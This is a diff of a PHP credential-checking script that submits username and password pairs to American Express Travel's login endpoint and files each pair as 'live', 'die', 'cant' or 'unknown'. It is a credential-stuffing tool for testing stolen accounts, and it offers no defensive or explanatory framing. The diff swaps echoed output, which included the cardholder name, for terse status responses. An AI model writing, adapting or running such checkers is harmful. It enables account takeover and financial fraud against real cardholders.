@@ -106,22 +106,22 @@ if (!isset($_REQUEST['empas']))
 
   $postAmex   = $curl->post('https://travel.americanexpress.com/travel/partner/authenticate', '{"userId":"'.$username.'","password":"'.$password.'","requestSource":"https://www.amextravel.com/api/user?redirect=https%3A%2F%2Fwww.amextravel.com%2Ffeatured-hotel-searches","clientId":""}');
   if (!$postAmex) {
-    echo $username . '|' . $password . ' - CANT CONNECT ' . PHP_EOL;
+    die('TIMEOUT');
 
     save('cant', $username . '|' . $password);
   } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {
 
-    echo $username . '|' . $password . ' - DIE ' . PHP_EOL;
+    die('DIE');
 
     save('die', $username . '|' . $password);
   } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {
 
-    echo $username . '|' . $password . ' - ' . $postAmex->cardMemberName . ' - LIVE ' . PHP_EOL;
+    die('LIVE');
 
     save('live', $username . '|' . $password);
   } else {
 
-    echo $username . '|' . $password . ' - UNKOWN ' . PHP_EOL;
+    die('UNKNOWN');
 
     save('unknown', $username . '|' . $password);
   }
